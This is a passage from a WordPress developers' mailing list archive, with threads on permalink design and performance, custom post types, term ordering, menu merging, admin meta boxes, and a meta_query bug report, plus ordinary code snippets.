says that the depth of thekeywords in the URL does not matter, but in this
case it would not be deep but onlytmb?m a way that categorizes the content. I
do not know to what extent this may be important in the URL.

Let's try not to throw out statistics based on personal feelings. If you
have a real-world example you can use, it makes for a more credible
argument. Fact of the matter is, the average web user is not even half as
tech savvy as the average person on this list. I don't say that to demean
anyone, I'm trying to point out that building WordPress and building sites
on WordPress means we have to build for the least common denominator -
people who want to create/access content but have no idea how the technology
behind it really works.

For a real world example, think back to February of last year and the
confusion caused when a ReadWriteWeb article about Facebook scored higher
than Facebook for the query "Facebook login" on Google (
http://www.switched.com/2010/02/12/readwritewebs-facebook-log-in-fiasco-angers-confounds-google/).
 A few thousand people over the period of a few hours went to the wrong site
trying to log in to Facebook because they'd type "facebook login" rather
than than "facebook.com" in their browser.

My point is that people will be confused by URLs and links. Particularly if
they're long strings with meaningless numbers (i.e. post IDs).

My previous comment was for urls where you also have the ID as an
additional parameter, the autocomplete feature (at least in chrome and
firefox) works just fine with "http://blabla/post_id/post_name" or
"http://blabla/post_name". I though it was already implied...

It doesn't work just fine if the user can't remember what the post_id is.  Again, design for users first.

Thanks for the suggestion. I shall definitely take that into
consideration for some of the sites.

What kinds of performance hit might I expect from large numbers of pages?

Thanks,

Once you start to get a large number of static pages (say > 100), you should
enable caching.  Truly evergreen content won't change all that frequently,
so a system that generates a static HTML page and serves that rather than
hitting the DB every time will alleviate any performance issues you come
across.

Post Type (i.e. Post vs Page) shouldn't impact performance; the problem
comes when WordPress can't differentiate blog posts from static Pages, based
on the permalink.

It sounds like you're basically creating Pages as Posts, and not using
chronology in any manner; in such case, I really don't think you're going to
see any difference in performance whether you use Pages or Posts.

Could be wrong, though...

[Really stupid question alert]
My only excuse for the following question is my relative new
introduction to wp and an over active imagination.
Earlier in this thread someone mentioned something that seemed to
indicate that the date/month or id might function as a trigger to
indicate "yo wp, this is a post not a page. Use a different type of
search." Basically the digit (number) nature of the date or id was
used to specify post-ness.

This got me to wondering if it might be possible to include a static
string of digits in my permalink that will trigger the "post-ness" but
be constant across posts so that people could remember the url.

This would be people usable in a site such as tutorials.com/101/how-to-blah-blah

Would this (admittedly limited gimmick) fix the performance hit caused
by using category?

Claude
p.s. Normally I would dig into the code to see what would happen in
this case. But, I have to admit to myself that I don't have enough
background in wp to trust my conclusions from the raw code.

Why does the user need to remember the post_id ? The autocomplete
feature works if you write only the relevant part (in this case the
post_name) in both cases.
By applying your reasoning, the users would need to remember the exact
url (including the http protocol, the domain name, the port if any,
etc) they already visited.
If you have any studies to backup your claims or that proves me
completely wrong, please share. I am interested.

Sure, using only pages is one way around the URL problems. But, this comes
at the expense of losing most of WordPress' functionality. Pages don't use
categories or tags and don't use feeds. Forget using plugins for related
posts, or most popular - these are all for posts, not pages.

One could argue that if a site contains only evergreen content then it
should not be using WordPress. However, that argument would be ignoring the
fact that many WordPress users are running sites, not blogs, on the
platform. The date-based limitations are a hangover from the days when
WordPress was just a blogging platform. If the number of "how do I do" posts
around the Web are any indication then many people today see it as a
CMS/site builder now. %postname% is common, despite the performance hit.

The issue here isn't whether anyone is using WordPress in a way others may
deem incorrect. It is how to generate the best URL structure for the way
people are using WordPress. If people choose to optimise their URL structure
for humans (which is always best for SEO anyway) and it doesn't result in
good performance from WordPress they have two options - optimise the heck
out of their server & caching, or move to a different platform. Most sites
won't hit performance bottlenecks for some time. In the meantime, the core
team are already working on improvements for the URL structure and rewrite
rules.

Are there any benchmarks for the real-world impact of using %postname%?

Humans care about dates. Leaving a date identifier (like the year) out
of the URL is actually de-optimizing the site for humans.

Like it or not, the time of content creation matters *to people*. If I
know a post was written in 2006 then that's substantially different
than if it was written in 2011.

WordPress Posts are time-based and indexed and oriented. If you're
creating content on a continuing basis, then the date of the creation
matters. Not having in the URL is removing critical information that
people use (and which search engines, for the most part, don't).

Lynne, I think this sense that you speak of is very important to include the
URL in the titleof the post (so the date to appear more visible in search
results) that in the URL. Know someone who usually put the date in the title
 of their texts?

See, people do not care if the date is in the URL, it is important to know
the date of thenews, the only way this information is more visible in the
URL that anywhere else on the page is if someone is only seeing the URL,
because frankly, when access to a newsURL is the last thing I'm paying
attention.

No, I'm talking about the URL. If I see an URL like
http://example.com/2006/11/06/great-wordpress-tricks I wouldn't bother going
to that link. I would assume the article was written on 06/11/2006 and that
it is no longer relevant. The problem with this is that some sites will post
a series of posts with updated information. So, there might be
http://example.com/2007/11/06/more-great-wordpress-tricks and
http://example.com/2011/11/06/even-more-great-wordpress-tricks.

BUT, on other sites, the 2006 post may be getting continually updated,
keeping the content fresh and relevant. So,
http://example.com/2006/11/06/great-wordpress-tricks might have been updated
yesterday but the URL makes me think its  nearly five years old.  I don't
think I am the only person who never bothers to visit URL's that come up in
SERP's that look old.

Sorry Lynne think I got it wrong what you said in another message and I agree
that siteswhose posts get updates with some frequency is not interesting to
put the date in the URL. Look, the more the topic grows more positive and
negative points appear on each structure.

Using the ID instead of DATE in the url I can include the date of update and
 maintaincontent on inside of you without updates we are compromising
understanding.

Why wouldn't someone, in that circumstance, write a *new* post, and then
cross-link?

(I'm actually about to do that for one of my particularly popular posts.)

I agree, I wouldn't either. And there is a pretty good chance that is no longer relevant.

Although there are certainly special cases where this is not appropriate in general those URLs are pretty much the correct way to do it from a content strategy, site architecture and user trust basis.  That structure groups posts by year, month and day. It gives the date to indicate to the reader when it was published and the likelihood that it is still relevant (or not.) And doing this engenders trust from the reader towards the site, especially if the site has lots of content that the reader finds frequently via search engines.

As an aside, unless the site gets a large number of posts per day I prefer the shorter URL with just year and month, like these:

http://example.com/2007/06/more-great-wordpress-tricks/
http://example.com/2011/06/even-more-great-wordpress-tricks/

> BUT, on other sites, the 2006 post may be getting continually updated,

> yesterday but the URL makes me think its  nearly five years old.  

And if the authors at a site do that they are, simply put making content strategy, site architecture and user trust basis errors.  We shouldn't justify a URL structure to bandaid a poor content strategy and lack of attention to site architecture.

What would be much better would be to create an "evergreen" page with a URL like the following and then continually update it instead

http://example.com/great-wordpress-tricks/

The evergreen page should link to each of the posts and then have each of the post's should link back to the evergreen page.  At the top of each post, or in a sidebar you could have an "ad" that promotes the evergreen page. This cross-linking will help concentrate link juice back to the evergreen page and the "ads" on the evergreen pages will generate awareness of the evergreen page causing more people to be more likely to link to it when they want a (more) authoritative reference.

And if "Pages" aren't a good idea then create a "Feature" custom post type and add these evergreens as features, i.e. 

http://example.com/features/great-wordpress-tricks/

Some people might say that using Features like this is essentially what category pages and tag pages do but the fact they are auto-generated tends to minimize their value and thus their impact on readers and search engines. If, on the other hand the evergreen pages are hand written and manually optimized with links to posts in context within the content then users (and search engines) will recognize they add much great value and give them appropriate credence.

Or at least that is what makes sense to me.

Not true. If a user visits a site frequently then the user will have lots of URLs in the autocomplete history and the browser will only show a handful.  Meetup.com is a perfect example of a site I visit often but that use sequential numbers for their URLs of their meetups rather than a year, month, day and topic. I can't tell you how infuriating it was to constantly have to navigate the site to fine a meetup I was organizing rather than just being able to use the browser history.  Take a look at these:

http://www.meetup.com/atlantawebmarketers/events/11954596/
http://www.meetup.com/atlantawebmarketers/events/9711037/
http://www.meetup.com/atlantawebmarketers/events/11918229/

I got to the point I would remember the first four digits of a meetup URL so I could get this, but I'd often forget. Meetup.com could have made my life as an organizer so much easier if they had just designed their URLs for users and not to make the life of their web developers easier.  (Truth be told, most of Meetup.com's URLs are well designed, just not the meetup-specfic URLs.)

I will admit that it matters more for a site with a large amount of traffic and/or where users spend a lot of time using, but it's still useful as a usability tool by following Jakob's Law of web user experience:

http://j-town.co.il/web_site_design/resources/presentations/2008-10-26/slides/03-jakobs-rule.html

But browser history is but one use-case for URL design; there are many others. I wrote a blog on the topic[1] with over 50 posts several years back, until I realized that people either got it or they didn't and the latter either didn't care or would passionately try to justify why it didn't matter. So I decided to focus my attentions elsewhere:


FWIW.

I'd agree *IF* the site is a date-based blog. If, however, it is using
WordPress as a content management system then there is nothing wrong with
the content strategy. Consider a book published in 2005. The author could
keep adding addendums and errata to keep the material updated but sooner or
later that author will release a new book. The same is true on sites that
provide technical or legal information. Small changes occur regularly. The
site owner can choose to write a new post, copying the majority of the
earlier advice and including the change. Or they could update the original
post to show deletions of outdated information and insertions of new. The
post may be 5 years old and completely up-to-date with latest developments.

All of this depends on how people are using WordPress. The assumption that
people only blog is fragile. Dates are relevant to blogs. Publication dates
AND last-modified dates are important to all other publications but not
necessarily wise to have in the URL.

Anyway, I've said my bit. I'll be quiet now and wait till the core can
handle %postname% without impacting performance as it does now ;)

Core handles %postname% just fine, as long as you don't also make a
bunch of Pages.

If you're going to use a URL strategy that makes it impossible to tell
the difference between a Post and a Page from looking at the URL, then
just don't use Pages. Problem solved.

Hello,

How would you advice me to order categories in database ? I have made the
drag/drop UI now, I am not sure how I should store them.

I went adding a term_order column in the plugin's activation hook.

Can this becomes an issue with WP future updates or anything else?

Those are arbitrary distinctions.  A post is for date-based content on a site; a blog, a news item, an update, etc.  Date-based content is still content, and using it as a CMS is used to mean so many different things it doesn't have a strong meaning, especially not for use the define use-cases in a debate.

Create a "Book" content type. If there are many books like at a publisher, include the year in the URL.  If a single book for an author's blog, maybe not.

Create an "Addendum and Errata" content type, and include the year and month in the URL. Link each from the book content type.  Reference each addendum and errata in a blog post, or just use blog posts for addendum and errata.

Not sure how this latter part is germane to the discussion?

In all those cases, updating time-based posts is a convenience for the author but not good content strategy, nor a good site architecture nor a good user experience.  I posit that in WordPress time-based events should be documented in time-based post types with time-based URLs. Persistent topics (like a Wikipedia entry) should be maintained and then linked from-and-to the time-based posts.  

I've studied this problem for many more years than WordPress has existed (starting in 1987 with database design and 1994 with web architecture) and I've yet to find a pervasive example that violates these principles.  I'm not saying a use-case doesn't exist, I'm only saying that I've never recognized one.

You mentioned "people only blog" assumption in reply to me, I did not mention that.  I'm very unlikely to ever make that assumption. I actually err on the opposite end of the spectrum since probably 90+% of my company's revenue is from clients that are using WordPress to build business sites that are not primarily blogs.

> Dates are relevant to blogs.

Dates are also relevant to any content that is time-based such as press releases, news stories, events, product promotions, newsletters, investor reports, and the list goes on (I just used http://www.oracle.com/ to give me inspiration for things that are date-based but not blogs. I doubt Oracle's main website would be considered "a blog.")

And those types of content should either be post_type='page' or a custom post type.  Or maybe I'm wrong?  I'd love to hear why that type of content would be better stored in post_type='post' that isn't "I'm not technical enough to figure out how to make it work."

Ironically I've got an extension that can do exactly that. It's in pre-alpha test, but AFAIK it works except for maybe a few edge cases. Anyone interested in testing please create a free bitbucket.org account and email me directly with your bitbucket screen name.

The 'My Category Order' plugin [1] adds a term_order field to the
terms table. A similar plugin of my own (not released yet) adds a
term_order field to the term_taxonomy table instead.

Adding table fields can potentially be an issue in future WordPress
versions. If a term order field is added it's likely it would work in
a similar way to your plugin or existing plugins, so I doubt
compatibility would be too big of a problem.

Just to drop this in here, We're looking at that, hopefully there'll be some
movement in 3.3.
There are a few different ways of going about it, once 3.2 is out I'll be
playing my hand at an alternative as well (to add to the list of the various
options)

That's completely true. However, there are exceptions. I use %postname% at
my proverbs site here: proverbhunter.com because using date based url would
make it really awkward as the content is organised on other bases. But,
since I'm using only one page on the system, I hope that is not a big deal,
as you mentioned earlier.

Not a valid exception.  Create a custom post type call "Proverb" instead of using a post_type='post'.

A "Proverb" custom post type would allow:

- URLs for the former to be distinct from URLs for posts or for pages.
- Post Metaboxes and Taxonomy Terms that are Proverb-specific.
- Queries that are Proverb-specific.
- A "Proverbs" section in the admin with an "Add Proverb" option. 
- A list of Proverb-specific solutions in the list of proverbs admin screen.

And that's just off the top of my head.

Need I go on?

-Mike

P.S. New proverb to add: 

"When the only tool you have is a hammer, every problem looks like a nail."

I've been using CPT since 3.0 beta and I know most of it benefits. What I
was interested to know is that it would be better in terms of URL
optimisation in my case to use a CPT in stead of Posts PT.

I went with the Posts PT becuase I'm not posing anything else than proverbs,
this is absolutely only proverbs and secondly I'm not aware of an advantage
of in terms of the URL optimisation you mentioned. Thanks very much for
that.

PS: The proverb you suggested is awesome - it will absolutely get in :D

If the only thing you will *ever* have on your site is proverbs and never anything else (no pages, not blog posts, no news, no nothing else), then I guess it is no better.  

But it seems rather limiting to choose posts when it is so easy to choose a custom post type. Worse is to advocate for use of posts for something better done with a CPT on a list where others may see the advice and without your pre-meditation choose not to use a custom post type and thus paint themselves into a corner.

Custom Post Type are the best feature of WP that every developer should ripe
as needed. However, in my case, I will have ONLY proverbs and I got an About
page - that's all. Thanks for the clarification though.

To avoid compatibility problems in future it would be interesting, instead
of creating afield in the table, create a relationship table?

Subject: [wp-hackers] Can you merge two menus?
Message-ID: <20110615155240.5a0127a4@Indy>

Hi,

I want to have two menus
- Guests Menu
- Members Menu

The members menu is an exact copy of Guest plus some extra items.

I know you can create two menus in admin but I would like to know
if it's possible to create a Members menu which only holds those
items available for members and merge these menu items with the guest
menu when needed.

It's probably going to be easier to create one menu and then, using hooks in PHP, remove those menu items for non-members.  Of course, others might be able to think of a different way.

I've always done this either with two separate menus and a conditional statement in the theme file.  Why do they need to be "merged"?

Because it's easier in maintenance of the menu. When you add a General
item, no need to worry you might forget to add them to other menus.

Use wp_get_nav_menu_items()[1] and then do an array_merge()[2], perhaps?

The best thing that could happen at this point is that we make sure
new WordPress developers are aware of how WordPress treats Magic
Quotes, and that it's consistent and expected. (I know that we
should've all read into settings far enough to find it, but not all of
us have.)

New devs don't know the history on this, and so sometimes may assume
that they aren't automagically enforced. Promoting awareness of this
fact could save new devs hrs of development, many headaches, and
prevent potential vulnerabilities.

Here's what I did and it seems to work:

if (is_user_logged_in()){
    add_filter('wp_nav_menu_objects', 'members_menu', 10, 2);
}
function rps_members_menu($sorted_menu_items, $args)
{
    $header_members = wp_get_nav_menu_items('Header_members');
    _wp_menu_item_classes_by_context( $header_members );
    foreach ($header_members as $item) {
        $sorted_menu_items[]=$item;
    }
    return $sorted_menu_items;
}

The Header_members only contains items for members.

Thanks to Mike Schinkel for getting me on the right track.

This seems like a goofy question, but I've ran into some problems, when 
creating both themes and plugins. When creating plugin from scratch, I 
put all the meta info required in empty file, name it like 
'plugin_name.php', go into WP dashboard, restart it - plugin not 
recognized. I go back, copy-paste the 'Hello, Dolly' plugin, rename it 
both in file name and in meta, delete all the content in file except 
meta comments, then go to WP dashboard, restart - and voila, new plugin 
appears.
So, what could this be all about?

Thanks in advance.

Have you double-checked that you have all the required headers? They

Quote from Codex: "The minimum information WordPress needs to recognize 
your Plugin is the Plugin Name line. The rest of the information (if 
present) will be used to create the table of Plugins on the Plugin 
management screen.". And yes, I did fill in the "Plugin Name" field. 
Wouldn't bother you otherwise.

Looks like that's all about the encoding - plugins are seen, if encoded 
in UTF-8, and not seen, if encoded in ASCII (or what's defalt in SciTE). 
I believe it won't harm to put this in Codex, anyway.

Hello,

A plugin I'm working in (neither released) uses term metadata for that 
(and other features). That is, I'm adding just a single term_meta table 
for a bunch of things.
I prefer to add a single multiuses table, whose rows and data can be 
cached and processed at init, than a field in an existing table; or 
worse, using a brand new table for each feature added.
Besides, this way I can add different order fields or values for the 
very same term (which you cannot do with a single field). This makes 
sense because other of the term meta features is to allow any term to 
have any number of parents, and often is needed that the term be sorted 
differently depending on the parent it's being viewed from.
A quick example: let's say you've got categories for "People with H" and 
"People with S". You might feel that Homer Simpson belongs to both: as 
"Homer Simpson" when listed from "People- H", and "Simpson, Homer" when 
listed from "People-S". If shown alone or in a batch (like a tag cloud), 
the category would be "Homer Simpson"; shown in the (special) category 
widget, then would apply the  "viewed from" stuff (the custom order, 
name, and description also). You can see that working in my site, FWIW.
There are already plugins to add some kind of term metadata in the repo 
(I think about three), so if you're interested just in this feature, you 
can use some of them to add the table and modify the widgets by 
yourself. But if you want that feature to be compatible/used with other 
features altogether (and not only compatible with possible future 
versions/implementations of the same feature/structure), you should 
design that with the big picture in mind.
Please note that with the termmeta method you can also namespace the key 
for the order: you can use my_plugin_term_order, instead of just 
menu_order or term_order or whatever. A good namespacing (which is 
*always* a good practice) would for certain avoid any compatibility 
problems with other implementations of the same feature that you didn't 
by yourself: they'd have another namespace.

Best,

Xavier

I've just added the term metadata plugin to a project I'm working on
http://wordpress.org/extend/plugins/taxonomy-metadata/

It just works.

I needed to add abbreviations to some long winded terms for display in other
parts of the site. The plugin provided the familiar metadata API
add_term_meta, get_term_meta, etc. Recommended.

Very true, but what about a tutorial that's regularly kept up to date,
use the date archive in the URL and you give the impression the
information is out of date.

I have a lot of content that would fall into this category and to give
an accurate date when the information is updated I manually change the
date it was posted. This technique does not work if you use dated
permalinks because changing the date a post was posted changes the
permalink structure (changes the URL)!

I never use dates in the URL, it's anti-SEO.

It's also a very good question and one I don't know the answer to. I
would also like to know what in performance terms is a lot of Static
Pages?

I tend to stay away from Static Pages because they don't offer as many
features as Posts: no Categories, Tags, even excerpts are missing by
default and so you have to think more about making sure all your
Static Pages are linked a reasonable amount of times. Over my sites
probably have close to half a million Posts and less than 200 Static
Pages. I tend to use Static Pages for sitemaps, about pages, static
front pages, important articles I'm going to spend time adding links
to etc... (doesn't matter if WordPress doesn't automatically link to
them perfectly).

Currently running them on two cheap Godaddy virtual servers (was a
stop gap when a dedicated server company I was using couldn't provide
a working server!!!) and at around 50,000 to 60,000 unique visitors a
day (~90% to WordPress sites using /%postname%) I don't have problems.

Adding the following to functions.php makes those objections moot:

add_action('init','my_init');
function my_init() {
add_post_type_support( 'page', 'excerpt' );
register_taxonomy_for_object_type( 'category', 'page' );
register_taxonomy_for_object_type( 'post_tag', 'page' );
}

I would hook into the wp_nav_menu_objects filter and unset ones that require
login.

I wrote this once at a local meetup in response to a question, but I can't
find the code (Aaron Jorbin might have it saved somewhere). But it was a
really short plugin.

I just replied to this, with a solution. Next time, please keep the email
headers intact, including the subject line, unless you are actually changing
the topic. Those of us who consume mailing lists in conversation format
appreciate it.

I will point out however, that you should wait to use is_user_logged_in()
until the init hook. Or simply throw is_user_logged_in() into the callback
and short-circuit the filter if you don't need to process anything.

Cheers,
Nacin

Something being kept up to date should be a page, not a post, IMO. Best 
practice (from UX perspective) is date in URL for posts, no date in URL 
for pages, since they are not meant to be temporal content.

UTF-8 and ASCII are identical for the first 128 characters, which is
all you should be putting into a PHP file in the first place. So your
response doesn't really make any sense. Text is text.

Instead, check your EOL characters. Improper end-of-lines can mess
things up too sometimes.

Apologies for changing the subject line earlier.

If you use unsetting of of menu items you still need to maintain two
menus at all times. If you add a menu item to members menu you must
also add it to the public one.

Why is it better to unset the members items as to solution I posted?


P.S. I posted the code snippet on my site as well:

Some projects have php files with a header comment like this:

<?php
// force UTF-8 ?

(for instance, ZenPhoto has this). Does this serve any purpose actually?

Hi Helen and all,

sorry for the very late reply to your message. I got involved into a 
project and of course your request to share my method to "move panels 
around" in Wordpress using Jquery slipped through the cracks. But now 
here I am, so get ready to learn this new technique :)

1. Add a new page to the admin interface, like you had explained with 
the function "yourprefix_help_page", using the HTML structure you 
described. Note the ID's associated to each box (p1, p2, etc):

<div class="wrap">
<h2>I like to move it, move it</h2>
<div class="meta-box-sortables ui-sortable">
<div class="postbox" id="p1">
<h3 class="hndle">Drag me around, babe</h3>
<div class="container">
<p>Your content goes here</p>
</div>
</div><!-- .postbox -->
<div class="postbox" id="p2">
<h3 class="hndle">Drag me, too</h3>
<div class="container">
<p>Your content goes here, again</p>
</div>
</div><!-- .postbox -->
</div><!-- .meta-box-sortables.ui-sortable-->
</div><!-- .wrap -->


2. Enqueue the only script [dashboard] needed to make everything move 
(at least this works in my case):

function move_me_around_scripts() {
     wp_enqueue_script('dashboard');
}
function admin_page_with_draggable_boxes(){
     $my_page = add_dashboard_page( 'moveit', 'moveit', 'read', 
'moveit', ... );
     add_action('load-'.$my_page, 'move_me_around_scripts');
}
add_action('admin_menu', 'admin_page_with_draggable_boxes');

3. Your boxes should be draggable now. Whenever you move something 
around, Wordpress (via jquery/ajax) sends a list of the boxes ID's back 
to the server, in the order they appear on the page after you moved 
them. All you have to do is to add some PHP to retrieve this information 
and use it. Edit the admin page source code as follows:

<div class="wrap">
<h2>I like to move it, move it</h2>
<div class="meta-box-sortables ui-sortable">

<?php
$user = wp_get_current_user();

// The label has the format: 
meta-box-order_WHERE_PAGE_IS_ATTACHED_page_PAGE_IDENTIFIER
$panels_order = get_user_option('meta-box-order_dashboard_page_moveit', 
$user->ID);
$panels_order = explode(',', $panels_order[0]);
if (!$panels_order) $panels_order = array('p1', 'p2'); // default order

foreach($panels_order as $a_panel_id)
     switch($a_panel_id):
         case 'p1':
?>
<div class="postbox" id="p1">
<h3 class="hndle">Drag me around, babe</h3>
<div class="container">
<p>Your content goes here</p>
</div>
</div><!-- .postbox -->
<?php break; case 'p2': ?>
<div class="postbox" id="p2">
<h3 class="hndle">Drag me, too</h3>
<div class="container">
<p>Your content goes here, again</p>
</div>
</div><!-- .postbox -->
<?php break;
     default:
         break;
endswitch; ?>

</div><!-- .meta-box-sortables.ui-sortable-->
</div><!-- .wrap -->

Please let me know if you have any questions! Happy... moving around!

Dino.

My approach was to have one menu, and if the user is a guest, then remove
all members-only menu items.

I think it's largely dependent on the use case. Though, it looks like your
code snippet uses internal functions -- that's something you'll want to
avoid.

You really don't need (and absolutely should not) do all of that. You
shouldn't do any of that.

Rather, use the core API, in particular add_meta_box() and do_meta_boxes().

You wrote that one on you're own computer.  If I remember correctly,
you used the optional css classes and looked for a specific keyword to
control if it should be shown or not.

Andrew,

according to the Codex, those functions only work on some admin pages:

Theadd_meta_box()function was introduced inVersion 2.5 
<http://codex.wordpress.org/Version_2.5>. It allows plugin developers to 
add sections to the Write Post, Write Page, and Write Link editing pages.

http://codex.wordpress.org/Function_Reference/add_meta_box

I want to create "movable" boxes in a new custom page generated by my 
plugin. Is there something I'm missing here?

Thanks,
Dino.

Not to WordPress or PHP, AFAIK. Might help them in some other system
they're using, I guess.

But again, if you're only using plaintext, UTF-8 == ASCII.

Yes. In that add_meta_box() takes a screen ID. By default, only certain
screens are supported -- the screens that call do_meta_boxes().

You can then call do_meta_boxes() the way core would, to generate meta
boxes.

Example:

<div class="postbox-container">
<?php
// Parameters: Screen identifier, placement on the screen
(normal/side/column3, etc.), an object that gets passed to the meta box.
do_meta_boxes( $screen->id, 'normal', $post );
?>
</div>

And:

add_meta_box( ... ) where the $page parameter is your $screen->id.

Subject: [wp-hackers] meta_query orderby bug
Message-ID: <BANLkTinf3Sugqn40JbUGUmM90ez2-+ROGw@mail.gmail.com>

Hello Everyone,

So this is my first bug that I was about to report. Then I read that I
should discuss this on #IRC or on mailing list. This is the first time
I am reporting a bug so please bare with me. :) Let me just describe
you the issue.

If we specify meta_key and an orderby query var. The way wordpress
handles them is that it adds them to the meta_query query var which is
an array of array. Wordpress adds new meta_query array to existing
meta_query arrays but the new array as inserted as the first element.

For example if I specified following:
$meta_key = 'priority';
$orderby = 'meta_value_num';
$meta_query = array(
    array(
      'key' => 'weight',
      'value' => 2,
      'compare' => '>=',
      'type' => 'NUMERIC'
   )
);

Then after Wordpress completes parsing the meta_query in function
_parse_meta_query at line #458 in file: wp-includes/meta.php The
resulting meta_query looks like following:
$meta_key = 'priority';
$orderby = 'meta_value_num';
$meta_query = array(
    array(
      'key' => 'priority'
    ),
    array(
      'key' => 'weight',
      'value' => 2,
      'compare' => '>=',
      'type' => 'NUMERIC'
   )
);


This all works fine if I have specified my meta_query and orderby
query vars before the pre_get_posts filter is run. But if I add
orderyby and meta_key in pre_get_posts filter then when WordPress
parses the meta_query again, instead of inserting the new array as the
first element it appends the new array to existing meta_query. And the
resulting meta_query looks like following:

$meta_query = array(
    array(
      'key' => 'weight',
      'value' => 2,
      'compare' => '>=',
      'type' => 'NUMERIC'
   ),
    array(
      'key' => 'priority'
    )
);

And when the meta_sql is generated the orderby is applied to the first
meta key value specified in meta_query. The problematic line is #2470
in wp-includes/query.php which is:

$q['meta_query'] = array_merge( $_meta_query, $q['meta_query'] );

But it should be:

$q['meta_query'] = array_merge( $q['meta_query'], $_meta_query );

So, is it really a bug? Should I report it on trac and be proud of it?
Or this is intended behavior?

Is this a bug, or a feature? If it's a feature, how would you recommend I change the orderby of comments for logged in users?

Not sure if this is the right forum for this, but the hacks subforum is mum as usual.

The pre_get_comments hook fires for all users. It's contained within
the function that queries comments, so if you're fetching comments
using the normal method (eg get_comments() or wp_list_comments() )
then this hook will fire.

You might want to check that another plugin (or your theme) isn't
doing something funky with comments (eg fetching them with a direct
SQL query).

Stumbled upon
http://www.weberz.com/blog/wordpress/seo-experts-give-wrong-advice-wordpress-permalinks/
which says the issue with permalinks and performance has been fixed in
WordPress 3.0, anyone know if that's right?

"Update 1/4/2011: The problems described in this article regarding
WordPress functionality breaking due to permalink structures have been
fixed in version 3.0 and higher. Now the permalink structure suggested
by the people mentioned in this article is the best solution for SEO
optimized URL?s. ? However the WordPress Codex, the official WordPress
documentation, still suggests that you should start your permalink
structure with a number for performance reasons. In most WordPress
sites, the performance hit caused using the permalink structure
suggested by the SEO experts below would not be large enough to
out-weigh the SEO benefits."

Have a WordPress SEO tutorial that advices to consider this issue, if
it's fixed can update my advice.

Funny the site above appears to use the format

/category/postname/

So wasn't following their own advice :-)

Bugs in alpha/beta versions can go to wp-testers. Bug reports such as this
can go straight to Trac. This list hasn't been used for core development for
quite a few years now.

So, is it really a bug? Should I report it on trac and be proud of it?

Sounds like a bug to me, but I can't find the code you reference in trunk.
Can you test again on 3.2 before reporting?

Thanks,

Performance of /%postname%/ was not addressed in 3.0. (Nor 3.1, or 3.2.
Likely for 3.3.) So the update at the top of the post [1] is incorrect.

There will be many people commenting on a post. So, when a commentator
visits the post, he should be able to see 'only' his own
comment(s).Post author can see all comments 'only' on his own post.
How can I do this in WordPress?

Wonderful, it is already fixed in 3.2. The new Meta data API took care of it.

I think, generally, the esc_*() functions are intended for *output* of data,
rather than for *input*. For *input* of data, you might be better-served
using the appropriate KSES filter, e.g. wp_filter_kses() for HTML, or
wp_filter_nohtml_kses() for normal text.

(Of course, if I'm wrong, I'm sure I'll be set straight shortly! :) )

Subject: [wp-hackers] wp_delete_term inconsistence use of action hooks
Message-ID: <BANLkTikH+ji0edfmF324toDcQS-CLCbrxQ@mail.gmail.com>

Hello,

I am working on a plugin that stores images and thumbnails for any term from
any configured taxonomy.

I make use of the wordpress metadata API to store informations about the
terms images and their thumbnails in a meta_termmeta table.

The problem comes when deleting a term. When a term get deleted, I need to
delete the its image and thumbnails.
The action hook I use is delete_term, action hook fired in wp_delete_meta
function.

Here is what I do in my delete_term function:

- I select the term's image/thumbnails informations using wp_get_metadata
function
- I then loop through the thumbnails informations and I delete those
- I finally delete the metadata using wp_delete_metadata function

My problem here is that when the delete_term action get fired, the term is
already deleted from the database, so the wp_get_metadata function don't
return the term metadata that I need before deleting it.

There is no pre_delete_term action, there is no delete_term / deleted_term
actions hook scheme, and definitely no action hook before the term is
deleted.

Any thought on how I can handle this?

Ignore that request. The get_metadata() function properly returns the
metadata of a deleted term in the delete_term hook. Another plugin conflict
made me think that.

I've just noticed that if the keys of the array contain minuses (dashes) 
in them, this will cause errors in your javascript. Firebug is telling 
me "missing : after property id", which I assume is a parse error.

I know I can solve this by not putting minuses in my array key names, 
but for backwards comparability, it would make my life much easier if I 
could in this situation.

Has anyone else encountered this? Is there a known workaround other than 
removing the minuses from the array keys or json_encoding the entire array?

Subject: [wp-hackers] XML RPC WordPress API Tutorial
Message-ID: <BANLkTikQ=n3GnNFwo6H3tzCqeZ1WsVEVag@mail.gmail.com>

Hi WordPress hackers,

I am designing a mobile application for a web project I developed
using WordPress.

Considering the data that the application will manage is the same data
produced by WordPress website, I've thought three possible solutions
to retrieve the data (in order of elegance):
1) to use XML RPC WordPress API but I don't know very well which
operations I can do using this API, so I need a good tutorial, can you
suggest me a good one?
2) to use a Web service hosted on the same location of WordPress
website so it can access easilly to the data produced by WordPress
website (that it's stored in a local database)
3) to execute sql queries from mobile application to the remote
WordPress Database, but I hate this solution

What are your suggestions for me? Has someone of us never realized an
application like that? If yes, which solution/technology did you use?

Thanks

Hi Pasquale,

IMHO you should consider creating a WordPress Plugin that uses the very easy to use Ajax Implementation in Wordpress to provide the services you need.

The protocol used could be JSON which is much less overhead than XMLRPC, esp. if your client is completely in Javascript.

Basically you create the Plugin that through wp_ajax_YOUR-METHOD-CALL or wp_ajax_nopriv_YOUR-METHOD-CALL-THAT-DOENSNT-NEED-AUTH actions registers your interface.

A couple of days ago an ebook abut WordPress and AJAX has been made publicly available to download from http://www.wpajax.com/download along with examples. You should give a look.

Hi Martin,

thank yo very mych for your suggestion.

Unfortunately, this is not what I need.

Maybe I have been not very clear, the application I should develop is
an iPhone mobile application, so probably the client will not be
written in javascript but in Objective C and it will not be hosted on
the same location of WordPress website, so I need a way to access
WordPress database from mobile application. For this reason I've
thought that a good solution could be use XML RPC (but I don't know a
lot about this technology) or also a web service.

What do you think about?

Thanks

Hi Pasquale,

I still think the AJAX approach would be a the most simple one even though only the first A applies (Asynchronous) and all the other letters are mumbo jumbo as it would neither use JavaScript nor XML. ;-) There's the extremely well performing JSONKit (https://github.com/johnezang/JSONKit) Library for parsing JSON and calling an AJAX Method from Objective C is nothing more then creating a HTTP Client and POSTing your request to it.

Otherwise you could take a look at the open sourced WordPress iOS APP (http://ios.wordpress.org/development/) which has a XMLRPC implementation of the API.

Put another way, does anyone see a problem if PHP data is passed as JS 
with string keys like:

var jsVar = {
     "string-key": "Foo Bar"
};

Instead of:

var jsVar = {
     nonStringKey: "Foo Bar"
};

I'm not an expert of the subject, but this seems to work just fine for 
me. Does anyone see any reason not to change it to this?

This would be a really simple patch on line 63 of 
"includes/class.wp-scripts.php"

XML-RPC :)

For examples of how to interact with WordPress over XML-RPC from a mobile platform you could look at the WordPress Mobile apps.

e.g. http://ios.trac.wordpress.org/

This may well have more deep implications. Even the autosave mechanism 
